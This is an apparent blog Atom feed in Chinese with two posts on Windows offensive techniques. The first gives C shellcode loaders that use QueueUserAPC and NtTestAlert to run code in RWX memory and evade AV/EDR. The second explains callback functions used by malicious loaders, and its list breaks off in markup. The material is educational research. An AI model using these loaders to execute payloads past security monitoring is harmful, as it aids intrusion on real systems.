<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>卡卡罗特取西经</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2025-09-26T02:52:05.469Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>ybdt</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>通过APC执行Shellcode</title>
    <link href="http://example.com/2025/09/26/%E9%80%9A%E8%BF%87APC%E6%89%A7%E8%A1%8CShellcode/"/>
    <id>http://example.com/2025/09/26/%E9%80%9A%E8%BF%87APC%E6%89%A7%E8%A1%8CShellcode/</id>
    <published>2025-09-26T02:50:20.000Z</published>
    <updated>2025-09-26T02:52:05.469Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本篇博客主要介绍APC是什么、APC函数何时被执行，不会包含太多深层次的分析，主要是介绍APC如何被用来执行shellcode</p><h1 id="APC介绍"><a href="#APC介绍" class="headerlink" title="APC介绍"></a>APC介绍</h1><p>APC，全称Asynchronous Procedure Calls，译为异步过程调用，在Windows下是一种机制（我猜测在其他操作系统下也是类似的机制），允许异步执行函数，所谓的异步执行，指的是当前线程执行过程中，有一个异步执行任务，当前线程无需等待这个异步执行任务，可以继续执行，相对应的，同步执行，指的是当前线程执行过程中，有一个同步执行任务，当前线程需要等待这个同步执行任务，无法继续执行，同步执行的结果当场就返回了，异步执行的结果是通过一个回调机制返回</p><p>Windows中关于APC的一个重要特点是，只有线程处于警报状态时，线程APC队列中的APC函数才会执行，通过调用SleepEx()、WaitForSingleObjectEx()、SignalObjectAndWaitEx()、SignalObjectAndWait()、WaitForMultipleObjectsEx()可以让线程处于警报状态</p><p>Windows中的APC包含多种类型，也分为用户模式和内核模式，本文中我们只关注用户模式下的QueueUserAPC</p><h1 id="APC执行Shellcode"><a href="#APC执行Shellcode" class="headerlink" title="APC执行Shellcode"></a>APC执行Shellcode</h1><p>为什么APC可以用于shellcode执行或远程进程注入，可以使用QueueUserAPC执行shellcode，而无需使用CreateThread/CreateThreadEx创建线程，或使用QueueUserAPC注入到远程线程，而无需使用CreateRemoteThread/CreateRemoteThreadEx创建远程线程，尤其是CreateRemoteThread/CreateRemoteThreadEx会被AV/EDR严格监控，通过用户模式Hook或者注册内核回调（PsProcessNotifyRoutine/PsThreadNotifyRoutine）</p><p>当使用用户模式APC执行shellcode，不管是本地线程还是远程线程，总是会创建一个新的用户模式APC队列，你可以想象APC是排队取餐的顾客，遵循先进先出的原则，接下来我们通过WaitForSingleObjectEx()让线程处于警报状态，以此触发当前APC队列中APC函数的执行，下列C语言实现的代码片段，展示了用户模式APC注入，没有规避RWX内存特征、没有进行shellcode加密，只是一个demo展示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    // 定义shellcode</span><br><span class="line">    unsigned char shellcode[] = &quot;\xfc\x48\x83...&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    // 申请内存</span><br><span class="line">    PVOID addr = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    // 拷贝shellcode到申请的内存</span><br><span class="line">    memcpy(addr, shellcode, sizeof(shellcode));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    // 为当前线程创建一个新的用户模式APC队列，队列中有一个函数</span><br><span class="line">    // 第一个参数为要执行的函数，指向申请内存的指针被强制转换为函数指针类型</span><br><span class="line">    // 第二个参数是线程句柄，通过GetCurrentThread()获取当前线程的伪句柄</span><br><span class="line">    // 第三个参数是要执行函数的参数，当前执行的函数无需参数，所以为NULL</span><br><span class="line">    QueueUserAPC((PAPCFUNC)addr, GetCurrentThread(), NULL);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    // 这个函数使当前线程进入警报的wait状态</span><br><span class="line">    // INFINITE表示这个wait是无期限的，也就是不会超时，线程会等候直到APC函数被执行或者其它形式的唤醒被触发</span><br><span class="line">    // TRUE参数表示这个wait是警报状态的，那会触发APC队列中的函数执行</span><br><span class="line">    WaitForSingleObjectEx(GetCurrentThread(), INFINITE, TRUE);</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="NtTestAlert"><a href="#NtTestAlert" class="headerlink" title="NtTestAlert"></a>NtTestAlert</h1><p>正如代码注释中提到的，第一步是通过QueueUserAPC创建一个新的用户模式APC队列，然后通过WaitForSingleObjectEx让线程处于警报状态，进而触发APC函数的执行，上述方案中，可以替换的部分是WaitForSingleObjectEx，可以通过NtTestAlert强制APC队列中的函数执行，无需让线程处于警报状态</p><p>换句话说，NtTestAlert的主要作用就是检查APC队列中是否有函数未被执行，如果有的话将执行它们，如果在调用NtTestAlert之前APC队列为空，则该函数将简单地返回，不产生任何影响，它的这个特点对于执行线程APC队列中的函数很有用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// NtTestAlert是Windows中的Native API，无法直接拿来用，需要先声明函数原型，动态获取后通过函数指针调用</span><br><span class="line">typedef NTSTATUS(NTAPI* PFN_NTTESTALERT)();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    // 定义shellcode</span><br><span class="line">    unsigned char shellcode[] = &quot;\xfc\x48\x83...&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    // 获取ntdll的模块句柄</span><br><span class="line">    HMODULE hNtdll = GetModuleHandleA(&quot;ntdll&quot;);</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    // 获取NtTestAlert的指针，并强制转换为上面声明的函数原型的类型</span><br><span class="line">    PFN_NTTESTALERT NtTestAlert = (PFN_NTTESTALERT)GetProcAddress(hNtdll, &quot;NtTestAlert&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    // 申请内存</span><br><span class="line">    PVOID addr = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    // 拷贝shellcode到申请的内存</span><br><span class="line">    memcpy(addr, shellcode, sizeof(shellcode));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    // 为当前线程创建一个新的用户模式APC队列，队列中有一个函数</span><br><span class="line">    // 第一个参数为要执行的函数，指向申请内存的指针被强制转换为函数指针类型</span><br><span class="line">    // 第二个参数是线程句柄，通过GetCurrentThread()获取当前线程的伪句柄</span><br><span class="line">    // 第三个参数是要执行函数的参数，当前执行的函数无需参数，所以为NULL</span><br><span class="line">    QueueUserAPC((PAPCFUNC)addr, GetCurrentThread(), NULL);</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    // 通过NtTestAlert执行APC队列中的函数</span><br><span class="line">    NtTestAlert();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本文已经讲解了APC如何被用来执行shellcode，这使攻击者可以用来绕过监控CreateThread()/CreateThreadEx()或CreateRemoteThread/CreateRemoteThreadEx的AV/EDR，虽然本文只是演示APC在本地进程的用法，我相信APC在远程进程注入中会更有用</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;本篇博客主要介绍APC是什么、APC函数何时被执行，不会包含太多深层次的分析，主要是介绍APC如何被用来执行shellcode&lt;/p&gt;
&lt;h</summary>
      
    
    
    
    <category term="APC注入" scheme="http://example.com/categories/APC%E6%B3%A8%E5%85%A5/"/>
    
    
    <category term="免杀研究" scheme="http://example.com/tags/%E5%85%8D%E6%9D%80%E7%A0%94%E7%A9%B6/"/>
    
  </entry>
  
  <entry>
    <title>回调函数</title>
    <link href="http://example.com/2025/09/18/%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0/"/>
    <id>http://example.com/2025/09/18/%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0/</id>
    <published>2025-09-18T02:13:14.000Z</published>
    <updated>2025-09-18T02:15:23.677Z</updated>
    
    <content type="html"><![CDATA[<p>恶意的Loader和PIS（Position-Independent Shellcode）会使用各种技术来绕过AV/EDR和安全人员的分析，其中代码执行这个环节经常会通过“回调函数”的方式来隐蔽的执行。回调的本质是将函数A的地址传给函数B，在函数B执行的过程中，触发某个条件后，停下来执行函数A</p><p>回调分为异步的和同步的</p><p>异步的回调例如，鼠标移动时，对应的Hook被触发，Hook处理的同时，鼠标继续移动</p><p>同步的回调例如，函数A要读取数据B，触发某个条件后，函数C修改数据B，然后函数A继续读取数据B</p><p>下面是一个回调函数的示例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line"></span><br><span class="line">// 声明窗口过程回调函数，用于处理窗口消息</span><br><span class="line">LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);</span><br><span class="line"></span><br><span class="line">int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) &#123;</span><br><span class="line">    // 注册窗口类</span><br><span class="line">    // 定义并初始化一个常量、宽字符数组</span><br><span class="line">    const wchar_t CLASS_NAME[] = L&quot;Sample Window Class&quot;;</span><br><span class="line"></span><br><span class="line">    // 向操作系统注册一种名为CLASS_NAME的新窗口类型，这种类型的窗口属于当前应用程序实例hInstance，并且所有发送给这类窗口的消息都由WindowProc函数来处理</span><br><span class="line">    WNDCLASS wc = &#123; &#125;;</span><br><span class="line">    wc.lpfnWndProc = WindowProc;  // 设置回调函数</span><br><span class="line">    wc.hInstance = hInstance;</span><br><span class="line">    wc.lpszClassName = CLASS_NAME;</span><br><span class="line">    RegisterClass(&amp;wc);</span><br><span class="line">    </span><br><span class="line">    // 创建窗口</span><br><span class="line">    HWND hwnd = CreateWindowEx(</span><br><span class="line">        0,                                        // 扩展窗口样式</span><br><span class="line">        CLASS_NAME,                               // 窗口类</span><br><span class="line">        L&quot;回调函数示例&quot;,                            // 窗口标题</span><br><span class="line">        WS_OVERLAPPEDWINDOW,                      // 窗口样式</span><br><span class="line">        CW_USEDEFAULT, CW_USEDEFAULT, 400, 300,   // 位置和大小</span><br><span class="line">        NULL,                                     // 父窗口</span><br><span class="line">        NULL,                                     // 菜单</span><br><span class="line">        hInstance,                                // 实例句柄</span><br><span class="line">        NULL                                      // 附加数据</span><br><span class="line">    );</span><br><span class="line">    if (hwnd == NULL) &#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // 显示窗口</span><br><span class="line">    ShowWindow(hwnd, nCmdShow);</span><br><span class="line">    </span><br><span class="line">    // 消息循环</span><br><span class="line">    MSG msg = &#123; &#125;;</span><br><span class="line">    while (GetMessage(&amp;msg, NULL, 0, 0))</span><br><span class="line">    &#123;</span><br><span class="line">        TranslateMessage(&amp;msg);</span><br><span class="line">        DispatchMessage(&amp;msg);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 窗口过程回调函数实现</span><br><span class="line">LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) &#123;</span><br><span class="line">    switch (uMsg)</span><br><span class="line">    &#123;</span><br><span class="line">        case WM_DESTROY:</span><br><span class="line">            PostQuitMessage(0);</span><br><span class="line">            return 0;</span><br><span class="line">        </span><br><span class="line">        case WM_PAINT:</span><br><span class="line">        &#123;</span><br><span class="line">            PAINTSTRUCT ps;</span><br><span class="line">            HDC hdc = BeginPaint(hwnd, &amp;ps);</span><br><span class="line">            </span><br><span class="line">            // 在窗口上绘制文本</span><br><span class="line">            TextOut(hdc, 50, 50, L&quot;这是一个回调函数示例&quot;, 9);</span><br><span class="line">            </span><br><span class="line">            EndPaint(hwnd, &amp;ps);</span><br><span class="line"></span><br><span class="line">            return 0;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        case WM_LBUTTONDOWN:</span><br><span class="line">            MessageBox(hwnd, L&quot;您点击了鼠标左键!&quot;, L&quot;提示&quot;, MB_OK);   // 鼠标左键点击时显示消息框</span><br><span class="line">            return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    return DefWindowProc(hwnd, uMsg, wParam, lParam);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码编译执行后，如下图<br><img src="/2025/09/18/%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0/01.png" alt="image"><br>注释中已经讲的很清楚了，再补充两句，Windows开发中好多东西看着眼花缭乱，其实就是typedef定义的别名，比如这条语句中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);</span><br></pre></td></tr></table></figure><p>CALLBACK就是__stdcall的别名，LRESULT是LONG_PTR的别名，而LONG_PTR会根据是64位还是32位，选择是__int64还是long，原型如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">typedef LONG_PTR LRESULT;</span><br><span class="line"></span><br><span class="line">#if defined(_WIN64)</span><br><span class="line">    typedef __int64 LONG_PTR;</span><br><span class="line">#else</span><br><span class="line">    typedef long LONG_PTR;</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">long：C/C++中基本的数据类型，有个需要注意的地方是，Windows下不管32位还是64位，long都是4字节有符号整数，但在Unix下long是8字节有符号整数</span><br><span class="line"></span><br><span class="line">__int64：微软编译器（MSVC）特有的数据类型，8字节有符号整数</span><br><span class="line"></span><br><span class="line">typedef unsigned int UINT;</span><br><span class="line"></span><br><span class="line">// 在64位系统上 (_WIN64 defined)</span><br><span class="line">typedef UINT_PTR WPARAM; // UINT_PTR 是64位无符号整型</span><br><span class="line">typedef LONG_PTR LPARAM; // LONG_PTR 是64位有符号整型</span><br><span class="line"></span><br><span class="line">// 在32位系统上</span><br><span class="line">typedef UINT WPARAM;     // UINT 是32位无符号整型</span><br><span class="line">typedef LONG LPARAM;     // LONG 是32位有符号整型</span><br><span class="line"></span><br><span class="line">#define WINAPI __stdcall</span><br><span class="line"></span><br><span class="line">HWND：窗口句柄，可以理解为指向窗口这个对象的类型</span><br><span class="line"></span><br><span class="line">HINSTANCE：应用程序实例句柄，一个应用程序在内存中可以有多个实例（进程），每个实例（进程）都是独一无二的，可以理解为指向这个应用程序实例对象的类型</span><br><span class="line"></span><br><span class="line">HMODULE：模块句柄，和HINSTANCE等价</span><br></pre></td></tr></table></figure><p>每次有新的回调函数被发现，都会给安全分析人员带来挑战，因此恶意软件开发者经常研究新的回调函数，下面将尝试列出全部的回调函数（准确的说是微软和第三方网站记录的），有助于AV/EDR重点监控</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span 